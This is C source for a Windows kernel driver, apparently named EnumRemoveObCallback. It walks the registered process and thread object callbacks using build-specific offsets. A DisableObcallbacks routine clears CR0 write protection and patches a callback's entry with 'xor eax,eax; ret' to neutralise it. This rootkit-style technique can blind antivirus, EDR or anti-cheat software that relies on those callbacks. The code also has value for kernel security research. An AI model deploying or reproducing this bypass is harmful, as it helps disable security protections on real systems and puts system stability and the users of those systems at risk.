
#define dprintf             DbgPrint

#define DEVICE_NAME         L"\\Device\\EnumRemoveObCallback"
#define LINK_NAME           L"\\DosDevices\\EnumRemoveObCallback"
#define LINK_GLOBAL_NAME    L"\\DosDevices\\Global\\EnumRemoveObCallback"

ULONG NtBuildNumber = 0;
ULONG ObjectCallbackListOffset = 0;

typedef struct _OB_CALLBACK {
    LIST_ENTRY  ListEntry;
    ULONG64     Unknown;
    ULONG64     ObHandle;
    ULONG64     ObjTypeAddr;
    ULONG64     PreCall;
    ULONG64     PostCall;
} OB_CALLBACK, *POB_CALLBACK;

BOOLEAN GetVersionAndHardCode()
{
    BOOLEAN b = FALSE;
    RTL_OSVERSIONINFOW  osi;
    osi.dwOSVersionInfoSize = sizeof(RTL_OSVERSIONINFOW);
    RtlFillMemory(&osi, sizeof(RTL_OSVERSIONINFOW), 0);
    RtlGetVersion(&osi);
    NtBuildNumber = osi.dwBuildNumber;
    DbgPrint("NtBuildNumber: %ld\n", NtBuildNumber);

    switch (NtBuildNumber) {
    case 7600:
    case 7601: {
        ObjectCallbackListOffset = 0xC0;
        b = TRUE;
        break;
    }

    case 9200: {
        ObjectCallbackListOffset = 0xC8; //OBJECT_TYPE.CallbackList
        b = TRUE;
        break;
    }

    case 9600: {
        ObjectCallbackListOffset = 0xC8; //OBJECT_TYPE.CallbackList
        b = TRUE;
        break;
    }

    default:
        break;
    }

    return b;
}

KIRQL WPOFFx64()
{
    KIRQL irql = KeRaiseIrqlToDpcLevel();
    UINT64 cr0 = __readcr0();
    cr0 &= 0xfffffffffffeffff;
    __writecr0(cr0);
    _disable();
    return irql;
}

void WPONx64(KIRQL irql)
{
    UINT64 cr0 = __readcr0();
    cr0 |= 0x10000;
    _enable();
    __writecr0(cr0);
    KeLowerIrql(irql);
}

VOID DisableObcallbacks(PVOID Address)
{
    KIRQL irql;
    CHAR patchCode[] = "\x33\xC0\xC3";  //xor eax,eax + ret

    if (!Address)
        return;

    if (MmIsAddressValid(Address)) {
        irql = WPOFFx64();
        memcpy(Address, patchCode, 3);
        WPONx64(irql);
    }
}

ULONG EnumObCallbacks()
{
    ULONG c = 0;
    PLIST_ENTRY CurrEntry = NULL;
    POB_CALLBACK pObCallback;
    BOOLEAN IsTxCallback;
    ULONG64 ObProcessCallbackListHead = *(ULONG64*)PsProcessType + ObjectCallbackListOffset;
    ULONG64 ObThreadCallbackListHead = *(ULONG64*)PsThreadType + ObjectCallbackListOffset;
    //
    dprintf("ObProcessCallbackListHead: %p\n", ObProcessCallbackListHead);
    CurrEntry = ((PLIST_ENTRY)ObProcessCallbackListHead)->Flink; //list_head的数据是垃圾数据，忽略

    do {
        pObCallback = (POB_CALLBACK)CurrEntry;

        if (pObCallback->ObHandle != 0) {
            dprintf("ObHandle: %p\n", pObCallback->ObHandle);
            dprintf("PreCall: %p\n", pObCallback->PreCall);
            dprintf("PostCall: %p\n", pObCallback->PostCall);
            c++;
        }

        CurrEntry = CurrEntry->Flink;
    } while (CurrEntry != (PLIST_ENTRY)ObProcessCallbackListHead);

    //
    dprintf("ObThreadCallbackListHead: %p\n", ObThreadCallbackListHead);
    CurrEntry = ((PLIST_ENTRY)ObThreadCallbackListHead)->Flink; //list_head的数据是垃圾数据，忽略

    do {
        pObCallback = (POB_CALLBACK)CurrEntry;

        if (pObCallback->ObHandle != 0) {
            dprintf("ObHandle: %p\n", pObCallback->ObHandle);
            dprintf("PreCall: %p\n", pObCallback->PreCall);
            dprintf("PostCall: %p\n", pObCallback->PostCall);
            c++;
        }

        CurrEntry = CurrEntry->Flink;
    } while (CurrEntry != (PLIST_ENTRY)ObThreadCallbackListHead);

    dprintf("ObCallback count: %ld\n", c);
    return c;
}